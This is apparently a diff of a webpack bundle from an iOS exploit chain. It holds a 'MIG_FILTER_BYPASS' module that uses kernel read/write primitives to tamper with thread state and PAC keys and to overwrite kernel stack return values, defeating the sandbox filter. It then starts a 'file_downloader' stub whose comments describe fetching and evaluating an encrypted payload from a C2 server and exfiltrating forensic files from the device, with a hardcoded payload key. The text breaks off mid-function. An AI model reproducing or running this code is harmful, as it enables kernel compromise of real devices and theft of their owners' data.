getMutex(thread)\n\t{\n\t\tlet mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData);\n\t\treturn mutex;\n\t}\n\tstatic getStack(thread)\n\t{\n\t\tlet stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().kstackptr);\n\t\treturn stackptr;\n\t}\n\tstatic injectGuardException(thread,code)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, not injecting exception since thread is dead`);\n\t\t\treturn false;\n\t\t}\n\n\t\t\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0x17n);\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, code);\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, code);\n\t\t}\n\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast |= AST_GUARD;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\t\treturn true;\n\t}\n\tstatic clearGuardException(thread)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, still clearing exception to avoid crash`);\n\t\t}\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast &= ~AST_GUARD | 0x80000000;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\n\t\t\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode) == 0x17n) {\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, 0n);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t}\n\t}\n\tstatic getOptions(thread)\n\t{\n\t\tlet options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options);\n\t\treturn options;\n\t}\n\tstatic setOptions(thread, options)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options, options);\n\t}\n\tstatic getRopPid(thread)\n\t{\n\t\tlet ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid);\n\t\treturn ropPid;\n\t}\n\tstatic getJopPid(thread)\n\t{\n\t\tlet jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid);\n\t\treturn jopPid;\n\t}\n\tstatic setPACKeys(thread, keyA, keyB)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid, keyA);\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid, keyB);\n\t}\n\n\tstatic getState(machThread)\n\t{\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlet stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem + 0x200n;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_get_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tstateCountPtr);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to read thread state\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_SIZE);\n\t\tlet state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__[\"default\"](stateBuff);\n\t\treturn state;\n\t}\n\n\tstatic setState(machThread, threadAddr, state)\n\t{\n\t\tlet options = 0;\n\t\tif (threadAddr) {\n\t\t\toptions = Thread.getOptions(threadAddr);\n\t\t\toptions |= 0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write(statePtr, state.buffer);\n\t\t\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_set_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tif (kr != 0)\n\t\t{\n\t\t\tconsole.log(TAG,`Failed thread_set_state with error:${kr}`);\n\t\t\treturn false;\n\t\t}\n\n\t\tif (threadAddr) {\n\t\t\toptions &= ~0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\t\treturn true;\n\t}\n\n\tstatic resume(machThread)\n\t{\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_resume\", machThread);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to resume suspended thread\");\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n}\n\n\n }),\n\n \"./src/libs/TaskRop/ThreadState.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( ThreadState)\n });\n var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/TaskRop/RegistersStruct.js\");\n\n\nclass ThreadState\n{\n\t#buffer;\n\t#dataView;\n\tconstructor(buffer, offset = 0)\n\t{\n\t\tthis.#buffer = buffer;\n\t\tthis.#dataView = new DataView(buffer,offset);\n\t\tthis.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"](buffer,offset);\n\t}\n\tget buffer()\n\t{\n\t\treturn this.#buffer;\n\t}\n\tget opaque_fp()\n\t{\n\t\treturn this.#dataView.getBigUint64(232,true);\n\t}\n\tset opaque_fp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(232,value,true);\n\t}\n\tget opaque_lr()\n\t{\n\t\treturn this.#dataView.getBigUint64(240,true);\n\t}\n\tset opaque_lr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(240,value,true);\n\t}\n\tget opaque_sp()\n\t{\n\t\treturn this.#dataView.getBigUint64(248,true);\n\t}\n\tset opaque_sp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(248,value,true);\n\t}\n\tget opaque_pc()\n\t{\n\t\treturn this.#dataView.getBigUint64(256,true);\n\t}\n\tset opaque_pc(value)\n\t{\n\t\tthis.#dataView.setBigUint64(256,value,true);\n\t}\n\tget cpsr()\n\t{\n\t\treturn this.#dataView.getUint32(264,true);\n\t}\n\tset cpsr(value)\n\t{\n\t\tthis.#dataView.setUint32(264,value,true);\n\t}\n\tget opaque_flags()\n\t{\n\t\treturn this.#dataView.getUint32(268,true);\n\t}\n\tset opaque_flags(value)\n\t{\n\t\tthis.#dataView.setUint32(268,value,true);\n\t}\n}\n\n })\n\n \t});\n\n \t\n \tvar __webpack_module_cache__ = {};\n \t\n \t\n \tfunction __webpack_require__(moduleId) {\n \t\t\n \t\tvar cachedModule = __webpack_module_cache__[moduleId];\n \t\tif (cachedModule !== undefined) {\n \t\t\treturn cachedModule.exports;\n \t\t}\n \t\t\n \t\tvar module = __webpack_module_cache__[moduleId] = {\n \t\t\t\n \t\t\t\n \t\t\texports: {}\n \t\t};\n \t\n \t\t\n \t\t__webpack_modules__[moduleId](module, module.exports, __webpack_require__);\n \t\n \t\t\n \t\treturn module.exports;\n \t}\n \t\n\n \t\n \t(() => {\n \t\t\n \t\t__webpack_require__.d = (exports, definition) => {\n \t\t\tfor(var key in definition) {\n \t\t\t\tif(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {\n \t\t\t\t\tObject.defineProperty(exports, key, { enumerable: true, get: definition[key] });\n \t\t\t\t}\n \t\t\t}\n \t\t};\n \t})();\n \t\n \t\n \t(() => {\n \t\t__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))\n \t})();\n \t\n \t\n \t(() => {\n \t\t\n \t\t__webpack_require__.r = (exports) => {\n \t\t\tif(typeof Symbol !== 'undefined' && Symbol.toStringTag) {\n \t\t\t\tObject.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });\n \t\t\t}\n \t\t\tObject.defineProperty(exports, '__esModule', { value: true });\n \t\t};\n \t})();\n \t\n\nvar __webpack_exports__ = {};\n\n(() => {\n\n__webpack_require__.r(__webpack_exports__);\n var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/Chain/Native.js\");\n var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( \"./src/libs/Chain/Chain.js\");\n var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( \"./src/libs/TaskRop/Task.js\");\n var libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( \"./src/libs/TaskRop/Thread.js\");\n var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__( \"./src/libs/TaskRop/TaskRop.js\");\n var libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__( \"./src/libs/JSUtils/Logger.js\");\n var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__( \"./src/libs/JSUtils/Utils.js\");\n var libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__( \"./src/libs/Driver/DriverNewThread.js\");\n\n\n\n\n\n\n\n\n\nconst TAG = \"MIG_FILTER_BYPASS\";\n\nconst RUN_FLAG_STOP = 0;\nconst RUN_FLAG_RUN = 1;\nconst RUN_FLAG_PAUSE = 2;\n\nfunction disarm_gc() {\n\n\tlet vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);\n\tlet heap = vm + 0xc0n;\n\tlet m_threadGroup = uread64(heap + 0x198n);\n\tlet threads = uread64(m_threadGroup);\n\tuwrite64(threads + 0x20n, 0x0n);\n\t\n}\n\nfunction kstrip(addr) {\n\treturn addr | 0xffffff8000000000n;\n}\n\nfunction lockSandboxLock() {\n\t\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t\n\t\n\t\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\t\n\t\n\n\tlet lockData = lockBuff32[2];\n\tlockData |= 0x410000;\t\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n\n\t\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n}\n\nfunction unlockSandboxLock() {\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t\n\t\n\t\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\n\tlet lockData = lockBuff32[2];\n\tlockData &= ~0x10000;\t\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n}\n\nfunction dumpKMem(addr, size) {\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read(addr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff64 = new BigUint64Array(buff);\n\tfor (let i=0, j=0; i<size; i+=8, j++) {\n\t\tlet bits = buff64[j] & 0xfffn;\n\t\tif (bits === 0x4a4n)\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);\n\t\telse\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')}`);\n\t}\n}\n\nfunction findReturnValueOffs(addr) {\n\t\n\tconst READ_SIZE = 0x1000;\n\t\n\tlet pageAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].trunc_page(addr);\n\tlet startAddr = pageAddr + 0x3000n;\n\tlet buff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(startAddr, READ_SIZE);\n\tif (!buff)\n\t\treturn false;\n\tlet buff64 = new BigUint64Array(buff);\n\tlet expectedLR = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migKernelStackLR;\n\n\t\n\t\n\tfor (let i=0, j=0; i<READ_SIZE; i+=8, j++) {\n\t\tlet val = kstrip(buff64[j]);\n\t\tif (val === expectedLR) {\n\t\t\t\n\n\t\t\t\n\t\t\tlet offs = startAddr + BigInt(i - 40);\n\t\t\treturn offs;\n\t\t}\n\t}\n\treturn false;\n}\n\nfunction disableFilterOnThread(threadAddr) {\n\t\n\tlet kstack = libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__[\"default\"].getStack(threadAddr);\n\tif (!kstack)\n\t\treturn false;\n\n\tkstack = kstrip(kstack);\n\tlet kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].UINT64_SIZE * 12);\n\tlet kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read64(kstack + kernelSPOffset);\n\tif (!kernelSP)\n\t\treturn false;\n\n\t\n\t\n\n\t\n\t\n\n\t\n\n\tlet offs = findReturnValueOffs(kernelSP);\n\tif (!offs) {\n\t\t\n\t\treturn false;\n\t}\n\n\t\n\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(offs, 0n);\n\n\tconsole.log(TAG, \"MIG syscall intercepted for thread: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(threadAddr));\n\n\treturn true;\n}\n\nfunction waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, timeout=5000) {\n\t\n\tlet startTimestamp = Date.now();\n\n\twhile (true) {\n\t\tlet runBypassFlag = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\tif (!runBypassFlag)\n\t\t\treturn RUN_FLAG_STOP;\n\t\tif (runBypassFlag == RUN_FLAG_PAUSE)\n\t\t\treturn RUN_FLAG_PAUSE;\n\n\t\tif (timeout && (Date.now() - startTimestamp >= timeout)) {\n\t\t\tconsole.log(TAG, \"Timeout waiting for a syscall\");\n\t\t\tbreak;\n\t\t}\n\n\t\tlet filterTriggered = false;\n\t\tlet monitorThread1 = monitorThread1Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread1Ptr) : false;\n\t\tlet monitorThread2 = monitorThread2Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread2Ptr) : false;\n\n\t\tif (monitorThread1 && monitorThread2) {\n\t\t\t\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread1);\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread2);\n\t\t}\n\t\telse {\n\t\t\t\n\t\t}\n\t\t\n\t\tif (filterTriggered)\n\t\t\tbreak;\n\n\t\t\n\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 50000);\n\t}\n\t\n\treturn RUN_FLAG_RUN;\n}\n\nfunction startFilterBypass(runBypassFlagPtr) {\n\tlet run = RUN_FLAG_PAUSE;\n\n\tlet selfTaskAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].gSelfTask.addr;\n\n\twhile (run) {\n\t\tif (run == RUN_FLAG_PAUSE) {\n\t\t\tconsole.log(TAG, \"Pausing filter bypass\");\n\t\t\twhile (true) {\n\t\t\t\trun = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\t\t\tif (run != RUN_FLAG_PAUSE) {\n\t\t\t\t\tif (run == RUN_FLAG_RUN)\n\t\t\t\t\t\tconsole.log(TAG, \"Resuming filter bypass\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 100000);\n\t\t\t}\n\t\t}\n\n\t\t\n\t\tlockSandboxLock();\n\t\t\n\n\t\trun = waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, 5000);\n\n\t\tunlockSandboxLock();\n\t\t\n\n\t\tif (run)\n\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"sched_yield\");\n\t}\n}\n\ndisarm_gc();\n\n\n\nconsole.log = libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__[\"default\"].log;\n\nconsole.log(TAG, \"Thread initialized!\");\n\nlet kernelControlPtr = thread_arg;\nlet kernelRWPtr = thread_arg + 0x8n;\nlet kernelBasePtr = thread_arg + 0x10n;\nlet mainThreadAddrPtr = thread_arg + 0x18n;\nlet runBypassFlagPtr = thread_arg + 0x20n;\nlet isRunningPtr = thread_arg + 0x28n;\nlet mutexPtr = thread_arg + 0x30n;\nlet migLockPtr = thread_arg + 0x38n;\nlet migSbxMsgPtr = thread_arg + 0x40n;\nlet migKernelStackLRPtr = thread_arg + 0x48n;\nlet monitorThread1Ptr = thread_arg + 0x50n;\nlet monitorThread2Ptr = thread_arg + 0x58n;\n\nlet kernelControl = uread64(kernelControlPtr);\nlet kernelRW = uread64(kernelRWPtr);\nlet kernelBase = uread64(kernelBasePtr);\nlet mainThreadAddr = uread64(mainThreadAddrPtr);\nrunBypassFlagPtr = uread64(runBypassFlagPtr);\nisRunningPtr = uread64(isRunningPtr);\nlet mutex = uread64(mutexPtr);\nlet migLock = uread64(migLockPtr);\nlet migSbxMsg = uread64(migSbxMsgPtr);\nlet migKernelStackLR = uread64(migKernelStackLRPtr);\nmonitorThread1Ptr = uread64(monitorThread1Ptr);\nmonitorThread2Ptr = uread64(monitorThread2Ptr);\n\nconsole.log(TAG, \"kernelControl:     \" + kernelControl);\nconsole.log(TAG, \"kernelRW:          \" + kernelRW);\nconsole.log(TAG, \"kernelBase:        \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(kernelBase));\nconsole.log(TAG, \"mainThreadAddr:    \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mainThreadAddr));\nconsole.log(TAG, \"runBypassFlagPtr:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(runBypassFlagPtr));\nconsole.log(TAG, \"isRunningPtr:      \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(isRunningPtr));\nconsole.log(TAG, \"mutex:             \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mutex));\nconsole.log(TAG, \"migLock:           \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migLock));\nconsole.log(TAG, \"migSbxMsg:         \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migSbxMsg));\nconsole.log(TAG, \"migKernelStackLR:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migKernelStackLR));\nconsole.log(TAG, \"monitorThread1Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread1Ptr));\nconsole.log(TAG, \"monitorThread2Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread2Ptr));\n\ntry {\n\tlet driver = new libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__[\"default\"](kernelControl, kernelRW, kernelBase);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].init(driver, mutex);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].testKRW();\n\tlibs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__[\"default\"].init();\n\n\tconsole.log(TAG, \"Chain initialized\");\n\n\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(isRunningPtr, 1);\n\n\tstartFilterBypass(runBypassFlagPtr);\n\n\tconsole.log(TAG, \"Terminating bypass thread\");\n}\ncatch (error) {\n\tconsole.log(TAG, \"Error: \" + error);\n\tconsole.log(TAG, \"\" + error.stack);\n}\n})();\n\nvar __webpack_export_target__ = exports;\nfor(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];\nif(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, \"__esModule\", { value: true });\n })()\n;");
 
-/***/ }),
+ }),
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js":
-/*!**********************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js ***!
-  \**********************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// Downloader Stub Payload\n// Runs under SpringBoard context (has network access)\n// Downloads extract_payload.js from C2, decrypts, and evals\n\nconst DARKSWORD_PAYLOAD_KEY = \"a3f8c2e1b5d9470f6c8a1e3b7d5f9201e4b6d082f7a5c31690d2e8f4a1b0c573\";\n\n// Forensics File Downloader Payload\n// Reads and exfiltrates forensically-relevant files from iOS device via HTTP\n// This payload should be injected into a process with filesystem access\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn 